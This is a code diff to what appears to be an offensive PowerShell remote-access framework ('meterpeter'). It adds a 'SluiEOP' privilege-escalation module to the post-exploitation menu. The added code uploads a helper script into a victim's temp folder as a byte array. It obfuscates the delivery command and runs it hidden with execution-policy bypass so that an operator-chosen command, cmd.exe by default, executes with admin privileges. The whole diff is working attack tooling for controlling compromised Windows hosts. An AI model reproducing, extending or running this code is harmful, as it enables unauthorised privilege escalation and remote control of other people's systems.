@@ -918,11 +918,43 @@ While($Client.Connected)
         write-host "   and put meterpeter in listenner mode to be abble to catch the connection.";
         write-host "`n`n   Modules     Description                  Remark" -ForegroundColor green;
         write-host "   -------     -----------                  ------";
+        write-host "   SluiEOP     Execute 1 command as admin   Client:User  - Privileges required";
         write-host "   getsystem   Escalate Client Privileges   Client:User  - Privileges required";
         write-host "   Delete      Delete Priv Escal settings   Client:User  - Privileges required";
         write-host "   Return      Return to Server Main Menu" -ForeGroundColor yellow;
         write-host "`n`n :meterpeter:Post:Escalate> " -NoNewline -ForeGroundColor Green;
         $Escal_choise = Read-Host;
+        If($Escal_choise -eq "SluiEOP" -or $Escal_choise -eq "slui")
+        {
+           $name = "SluiEOP.ps1";
+           $File = "$Bin$name"
+           If(([System.IO.File]::Exists("$File")))
+           {
+              write-host " - Input Command: " -NoNewline;
+              $mYcOMMAND = Read-Host
+              If(-not($mYcOMMAND) -or $mYcOMMAND -eq $null){$mYcOMMAND = "C:\Windows\System32\cmd.exe"}
+              write-host " Executing: '$mYcOMMAND' with admin privileges." -ForegroundColor Blue -BackgroundColor White
+              ## Write Local script (SluiEOP.ps1.ps1) to Remote-Host $env:tmp
+              $FileBytes = [io.file]::ReadAllBytes("$File") -join ',';
+              $FileBytes = "($FileBytes)";
+              $File = $File.Split('\')[-1];
+              $File = $File.Split('/')[-1];
+              $Command = "`$1=`"`$env:tmp\#`";`$2=@;If(!([System.IO.File]::Exists(`"`$1`"))){[System.IO.File]::WriteAllBytes(`"`$1`",`$2);`"`$1`"};powershell -exec bypass -w 1 -File `"$env:TMP\SluiEOP.ps1`" `"$mYcOMMAND`""
+              $Command = Variable_Obfuscation(Character_Obfuscation($Command));
+              $Command = $Command -replace "#","$File";
+              $Command = $Command -replace "@","$FileBytes";
+              $Upload = $True;
+              $SluiEOP = "True"
+           }else{
+              ## Local File { SluiEOP.ps1 } not found .
+              Write-Host "`n`n   Status     Local Path" -ForeGroundColor green;
+              Write-Host "   ------     ----------";
+              Write-Host "   Not Found  $File" -ForeGroundColor red;
+              $File = $Null;
+              $Command = $Null;
+              $Upload = $False; 
+           }
+        }
         If($Escal_choise -eq "GetSystem" -or $Escal_choise -eq "getsystem")
         {
           write-host " - Input Delay Time (eg: 60): " -NoNewline;
@@ -1997,6 +2029,11 @@ While($Client.Connected)
           {
             Write-Host "   execute  :meterpeter> Get-Help ./GetBrowsers.ps1 -full" -ForeGroundColor Yellow;
             $Tripflop = "False";
+          } 
+          If($SluiEOP -eq "True")
+          {
+            write-host "   Exec:    '$mYcOMMAND' (with SYSTEM privs)" -ForeGroundColor yellow;Start-Sleep -Seconds 1;
+            $SluiEOP = "False";
           }
           If($Flipflop -eq "True")
           {
